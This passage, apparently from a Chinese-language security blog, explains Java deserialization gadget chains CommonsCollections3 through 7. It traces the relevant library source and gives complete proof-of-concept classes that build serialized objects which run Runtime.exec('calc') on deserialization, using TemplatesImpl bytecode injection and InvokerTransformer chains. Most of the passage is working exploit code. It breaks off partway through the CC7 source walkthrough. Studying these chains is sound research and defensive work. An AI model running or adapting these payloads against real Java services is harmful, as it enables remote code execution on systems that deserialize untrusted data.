_class[_transletIndex].getConstructor().newInstance(); translet.postInitialization(); translet.setTemplates(this); translet.setOverrideDefaultParser(_overrideDefaultParser); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) &#123; translet.setAuxiliaryClasses(_auxClasses); &#125; return translet; &#125; catch (InstantiationException | IllegalAccessException | NoSuchMethodException | InvocationTargetException e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString(), e); &#125;&#125; 跟进 defineTransletClases，注意几个问题 _class[i] = loader.defineClass(_bytecodes[i]); 对 byte 进行了还原 需要设置父类为 AbstractTranslet ，默认状态下_transletIndex 的值为 -1，如果进入这个 if 比较后，会给_transletIndex附值至少为 0，不然会抛出异常。这里我们也不能通过反射的方式来设置_transletIndex的值，因为还是会进入到_auxClasses方法中，此方法会报出错误，无法正常的序列化。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950private void defineTransletClasses() throws TransformerConfigurationException &#123; if (_bytecodes == null) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); &#125; TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() &#123; public Object run() &#123; return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); &#125; &#125;); try &#123; final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount &gt; 1) &#123; _auxClasses = new HashMap&lt;&gt;(); &#125; for (int i = 0; i &lt; classCount; i++) &#123; _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123; _transletIndex = i; &#125; else &#123; _auxClasses.put(_class[i].getName(), _class[i]); &#125; &#125; if (_transletIndex &lt; 0) &#123; ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125; catch (ClassFormatError e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; catch (LinkageError e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125;&#125; 回到 TemplatesImpl#getTransletInstance 中，这里进行了实例化，也就是这里会调用我们 static 代码块的代码 12AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].getConstructor().newInstance(); 沿用之前 CC1 的思路，目前的核心目的是寻找调用 ChainedTransformer 的 transform 的类 看一下 TransformingComparator#compare ,在上面构造函数实例化对象的时候给 this.transformer 附值为传入的 transformer，这里直接调用 transform 方法，符合我们的构造条件 12345678910public TransformingComparator(Transformer&lt;? super I, ? extends O&gt; transformer, Comparator&lt;O&gt; decorated) &#123; this.decorated = decorated; this.transformer = transformer;&#125;public int compare(I obj1, I obj2) &#123; O value1 = this.transformer.transform(obj1); O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2);&#125; 后续寻找使用这个链的方法，利用链比较复杂，切换到正向PriorityQueue#readObject ，调用了 heapify 方法 12345678910111213141516171819private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; // Read in size, and any hidden stuff s.defaultReadObject(); // Read in (and discard) array length s.readInt(); SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size); queue = new Object[size]; // Read in all elements. for (int i = 0; i &lt; size; i++) queue[i] = s.readObject(); // Elements are guaranteed to be in \"proper order\", but the // spec has never explained what that might be. heapify();&#125; PriorityQueue#heapify 里调用了 siftDown ，但是这里有个条件就是要满足 int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0,size至少为2 1234private void heapify() &#123; for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--) siftDown(i, (E) queue[i]);&#125; 看一下 PriorityQueue#siftDown 12345 if (comparator != null) siftDownUsingComparator(k, x); else siftDownComparable(k, x);&#125; 随后用到PriorityQueue#siftDownUsingComparator 12345678910111213141516private void siftDownUsingComparator(int k, E x) &#123; int half = size &gt;&gt;&gt; 1; while (k &lt; half) &#123; int child = (k &lt;&lt; 1) + 1; Object c = queue[child]; int right = child + 1; if (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; 0) c = queue[child = right]; if (comparator.compare(x, (E) c) &lt;= 0) break; queue[k] = c; k = child; &#125; queue[k] = x;&#125; 最重要的参数就是 comparator,可控即可RCE.接下来我们的任务是如何调用 TemplatesImpl#newTransformer 以及如何与readObject 结合 回顾 InvokerTransformer，调用其 transform 方法，如果可控 transform 方法中参数，以及 this.iMethodName 即可调用任意类的任意方法 1234567891011121314private InvokerTransformer(String methodName) &#123; this.iMethodName = methodName; this.iParamTypes = null; this.iArgs = null;&#125;public O transform(Object input) &#123; if (input == null) &#123; return null; &#125; else &#123; try &#123; Class&lt;?&gt; cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); CommonsCollections3cc3更像是cc1+cc2的结合体 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class ComCol3 &#123; public static void main(String[] args) throws Exception &#123; ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"TestDemo\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc\\\");\"; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]&#123;classBytes&#125;; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"TestDemo\"); setFieldValue(templates, \"_class\", null); setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); Transformer[] realPoc = new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;; ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]&#123; new ConstantTransformer(\"random\")&#125;); Map innerMap = new HashMap(); Class clz = Class.forName(\"org.apache.commons.collections.map.LazyMap\"); Constructor construct = clz.getDeclaredConstructor(Map.class, Transformer.class); construct.setAccessible(true); LazyMap mapDemo = (LazyMap) construct.newInstance(innerMap, fakeChain); Constructor handler_construct = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class, Map.class); handler_construct.setAccessible(true); InvocationHandler map_handler = (InvocationHandler) handler_construct.newInstance(Override.class, mapDemo); Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]&#123;Map.class&#125;, map_handler); Constructor AnnotationInvocationHandler_Construct = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class, Map.class); AnnotationInvocationHandler_Construct.setAccessible(true); InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Construct.newInstance(Override.class, proxy_map); Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(fakeChain, realPoc); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(handler); oos.close(); System.out.println(bos); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())); ois.readObject(); &#125; public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123; final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); &#125; public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123; Field field = null; try &#123; field = clazz.getDeclaredField(fieldName); field.setAccessible(true); &#125; catch (NoSuchFieldException ex) &#123; if (clazz.getSuperclass() != null) &#123; field = getField(clazz.getSuperclass(), fieldName); &#125; &#125; return field; &#125;&#125; 利用链 12345678910111213141516Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() 先看一下 InstantiateTransformer#transform，就是通过反射调用构造函数来实例化对象 123456789public Object transform(Object input) &#123; try &#123; if (!(input instanceof Class)) &#123; throw new FunctorException(\"InstantiateTransformer: Input object was not an instanceof Class, it was a \" + (input == null ? \"null object\" : input.getClass().getName())); &#125; else &#123; Constructor con = ((Class)input).getConstructor(this.iParamTypes); return con.newInstance(this.iArgs); &#125; &#125; CC3 用到了 TrAXFilter 这个类，其构造方法会调用 templates.newTransformer()，且 templates 可控 12345678public TrAXFilter(Templates templates) throws TransformerConfigurationException &#123; _templates = templates; _transformer = (TransformerImpl) templates.newTransformer(); _transformerHandler = new TransformerHandlerImpl(_transformer); _overrideDefaultParser = _transformer.overrideDefaultParser(); &#125; CommonsCollections4测试环境 jdk1.7 Commons Collections 4.0cc4也没什么新的东西，实际上算是cc2和cc3的杂交体。。 cc3前半段用的是cc1的，在cc4里稍微改了一下，前半段换成cc2的了 123456789101112131415161718Gadget chain: ObjectInputStream.readObject() PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() poc 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InstantiateTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.PriorityQueue;public class ComCol4 &#123; public static void main(String[] args) throws Exception &#123; ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc\\\");\"; // 创建 static 代码块，并插入代码 cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错 // 写入.class 文件 byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]&#123;classBytes&#125;; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); // 进入 defineTransletClasses() 方法需要的条件 setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;) &#125;); Constructor constructor = Class.forName(\"org.apache.commons.collections4.functors.InvokerTransformer\").getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\"newTransformer\"); TransformingComparator comparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); Object[] queue_array = new Object[]&#123;templates,1&#125;; Field queue_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,comparator); try&#123; ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc4\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc4\")); inputStream.readObject(); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123; final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); &#125; public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123; Field field = null; try &#123; field = clazz.getDeclaredField(fieldName); field.setAccessible(true); &#125; catch (NoSuchFieldException ex) &#123; if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); &#125; return field; &#125;&#125; CommonsCollections5适用版本：3.1-3.2.1，JDK 1.8 利用链： 12345678910111213141516Gadget chain: ObjectInputStream.readObject() BadAttributeValueExpException.readObject() TiedMapEntry.toString() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.util.HashMap;import java.util.Map;public class ComCol5 &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException, NoSuchFieldException &#123; Transformer[] realPoc = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", new Class[0]&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123; (\"calc\")&#125;)&#125;; ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]&#123; new ConstantTransformer(\"random\")&#125;); Map innerMap = new HashMap(); LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, fakeChain); TiedMapEntry rceDemo = new TiedMapEntry(mapDemo, \"random\"); BadAttributeValueExpException finaldemo = new BadAttributeValueExpException(\"random\"); Field valDemo = Class.forName(\"javax.management.BadAttributeValueExpException\").getDeclaredField(\"val\"); valDemo.setAccessible(true); valDemo.set(finaldemo, rceDemo); Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(fakeChain, realPoc); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(finaldemo); oos.close(); System.out.println(bos); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())); ois.readObject(); &#125;&#125; 在cc5中用到的是TiedMapEntry中的toString方法： 123public String toString() &#123; return this.getKey() + \"=\" + this.getValue(); &#125; 跟进getValue方法： 123public V getValue() &#123; return this.map.get(this.key);&#125; 可以发现这里对this.map调用了get方法，并将key传递进去，所以这里只需要令map为我们前面构造好的LazyMap，即可触发rce。其中map和key是可控的。 1234public TiedMapEntry(Map map, Object key) &#123; this.map = map; this.key = key;&#125; 接下来我们需要找哪里调用了toString方法，在cc5中使用了BadAttributeValueExpException这个类。 valObj从Filed中取出来的，通过反射来设置BadAttributeValueExpException中val的值为TiedMapEntry即可触发命令执行。 123456789101112131415161718192021private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(\"val\", null); if (valObj == null) &#123; val = null; &#125; else if (valObj instanceof String) &#123; val= valObj; &#125; else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) &#123; val = valObj.toString();//调用点 &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + \"@\" + valObj.getClass().getName(); &#125; &#125; 为什么创建BadAttributeValueExpException实例时不直接将构造好的TiedMapEntry传进去而要通过反射来修改val的值？以下为BadAttributeValueExpException的构造方法： 123public BadAttributeValueExpException (Object val) &#123; this.val = val == null ? null : val.toString(); &#125; 可以发现，如果我们直接将前面构造好的TiedMapEntry传进去，在这里就会触发toString，从而导致rce。此时val的值为UNIXProcess，这是不可以被反序列化的，所以我们需要在不触发rce的前提，将val设置为构造好的TiedMapEntry。否则就会报出错误。 CommonsCollections6CC6 特点：适用范围广，受 JDK 版本影响最小 poc1 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.HashSet;import java.util.Map;public class ComCol6 &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException , InstantiationException, IOException, NoSuchFieldException &#123; Transformer[] realPoc = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", new Class[0]&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123; (\"calc\")&#125;)&#125;; ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]&#123; new ConstantTransformer(\"random\")&#125;); Map innerMap = new HashMap(); LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, fakeChain); TiedMapEntry rceDemo = new TiedMapEntry(mapDemo, \"random\"); HashSet map = new HashSet(1); map.add(\"foo\"); Field f = null; try &#123; f = HashSet.class.getDeclaredField(\"map\"); &#125; catch (NoSuchFieldException e) &#123; f = HashSet.class.getDeclaredField(\"backingMap\"); &#125; f.setAccessible(true); HashMap innimpl = (HashMap) f.get(map); Field f2 = null; try &#123; f2 = HashMap.class.getDeclaredField(\"table\"); &#125; catch (NoSuchFieldException e) &#123; f2 = HashMap.class.getDeclaredField(\"elementData\"); &#125; f2.setAccessible(true); Object[] array = (Object[]) f2.get(innimpl); Object node = array[0]; if(node == null)&#123; node = array[1]; &#125; Field keyField = null; try&#123; keyField = node.getClass().getDeclaredField(\"key\"); &#125;catch(Exception e)&#123; keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\"); &#125; keyField.setAccessible(true); keyField.set(node, rceDemo); Field cf = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); cf.setAccessible(true); cf.set(fakeChain, realPoc); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(map); oos.close(); System.out.println(bos); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())); ois.readObject(); &#125;&#125; 利用链 1234567891011java.io.ObjectInputStream.readObject() java.util.HashSet.readObject() java.util.HashMap.put() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() CC6 其实跟 CC5 是在 TiedMapEntry#getValue 延伸出来并行的两条链 回顾我们通过 TiedMapEntry#getValue 而进行 RCE 的 demo 回顾 TiedMapEntry 里面的方法，CC5 用的是 TiedMapEntry#toString，里面调用了getValue， 那么其实在 TiedMapEntry 还有 hashCode 跟 equals 同样调用了 getValue,cc6中使用hashCode 12345678910111213141516public boolean equals(Object obj) &#123; if (obj == this) &#123; return true; &#125; else if (!(obj instanceof Entry)) &#123; return false; &#125; else &#123; Entry other = (Entry)obj; Object value = this.getValue(); return (this.key == null ? other.getKey() == null : this.key.equals(other.getKey())) &amp;&amp; (value == null ? other.getValue() == null : value.equals(other.getValue())); &#125;&#125;public int hashCode() &#123; Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());&#125; 接着就需要找哪里触发了hashCode，cc6中使用的是HashMap#hash 1234static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; key目前还不是我们可控的，所以需要找某个点调用了hash方法，并且传递的参数是我们可控的，这里用到了HashMap#put 123public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true); &#125; key还是不是我们可控的，所以还需要找某个点调用了put方法，并且传递的第一个参数是我们可控的，最后找到了HashSet#readObject 12345678910111213private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; // Read in any hidden serialization magic s.defaultReadObject(); …… // Read in all elements in the proper order. for (int i=0; i&lt;size; i++) &#123; @SuppressWarnings(\"unchecked\") E e = (E) s.readObject(); map.put(e, PRESENT); &#125; &#125; poc2 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;;import java.util.Map;public class ComCol4 &#123; public static void main(String[] args) throws Exception &#123; Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;; Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; \"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123; String.class &#125;, new String[] &#123; \"calc\" &#125;), new ConstantTransformer(1), &#125;; Transformer transformerChain = new ChainedTransformer(fakeTransformers); // 不再使用原CommonsCollections6中的HashSet，直接使用HashMap Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry tme = new TiedMapEntry(outerMap, \"keykey\"); Map expMap = new HashMap(); expMap.put(tme, \"valuevalue\"); outerMap.remove(\"keykey\"); Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(transformerChain, transformers); // ================== // 生成序列化字符串 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); // 本地测试触发 System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); &#125;&#125; 简化链中用到了 HashMap#readObject 中的 hash 方法来触发 hashCode 方法 12345678910111213 private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123;…… // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(\"unchecked\") K key = (K) s.readObject(); @SuppressWarnings(\"unchecked\") V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); &#125; &#125; &#125; CommonsCollections7poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.util.HashMap;;import java.util.Hashtable;import java.util.Map;public class ComCol7 &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException, NoSuchFieldException &#123; Transformer[] realPoc = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", new Class[0]&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123; (\"calc\")&#125;), new ConstantTransformer(1)&#125;; ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]&#123; new ConstantTransformer(\"random\")&#125;); Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject Map lazyMap1 = LazyMap.decorate(innerMap1, fakeChain); lazyMap1.put(\"yy\", 1); Map lazyMap2 = LazyMap.decorate(innerMap2, fakeChain); lazyMap2.put(\"zZ\", 1); // Use the colliding Maps as keys in Hashtable Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, 1); hashtable.put(lazyMap2, 2); Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(fakeChain, realPoc); lazyMap2.remove(\"yy\"); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(hashtable); oos.close(); System.out.println(bos); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())); ois.readObject(); &#125;&#125; cc7通过AbstractMap#equals来触发对LazyMap#get方法的调用。如果这里的m是我们可控的，那么我们设置m为LazyMap，即可完成后面的rce触发。 12345678910111213141516171819202122public boolean equals(Object o) &#123; if (o == this) return true; if (!(o instanceof Map)) return false; Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o; if (m.size() != size()) return false; try &#123; Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator(); while (i.hasNext()) &#123; Entry&lt;K,V&gt; e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) &#123; if (!(m.get(key)==null &amp;&amp; m.containsKey(key))) return false; &#125; else &#123; if (!value.equals(m.get(key))) return false; 先寻找调用equals方法的点，cc7中使用了HashTable#reconstitutionPut： 123456789101112131415161718192021private void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value) throws StreamCorruptedException&#123; if (value == null) &#123; throw new java.io.StreamCorruptedException(); &#125; // Makes sure the key is not already in the hashtable. // This should not happen in deserialized version. int hash = key.hashCode(); int index = (hash &amp; 0x7FFFFFFF) % tab.length; for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) &#123; if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123; throw new java.io.StreamCorruptedException(); &#125; &#125; // Creates the new entry. @SuppressWarnings(\"unchecked\") Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index]; tab[index] = new Entry&lt;&gt;(hash, key, value, e); count++;&#125; 这里的key如果是我们可控的，那么m就是我们可控的，接着在HashTable#readObject中调用了reconstitutionPut方法，并将key传递进去： 1234567891011121314private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException&#123; …… // Read the number of elements and then all the key/value objects for (; elements &gt; 0; elements--) &#123; @SuppressWarnings(\"unchecked\") K key = (K)s.readObject(); @SuppressWarnings(\"unchecked\") V value = (V)s.readObject(); // sync is eliminated for performance reconstitutionPut(table, key, value); &#125;&#125; 在readObject方法中传递进去的key，是使用readObject得到的，那么在writeObject处，也必然会有： 12345678910111213141516171819202122232425262728293031private void writeObject(java.io.ObjectOutputStream s) throws IOException &#123; Entry&lt;Object, Object&gt; entryStack = null; synchronized (this) &#123; // Write out the threshold and loadFactor s.defaultWriteObject(); // Write out the length and count of elements s.writeInt(table.length); s.writeInt(count); // Stack copies of the entries in the table for (int index = 0; index 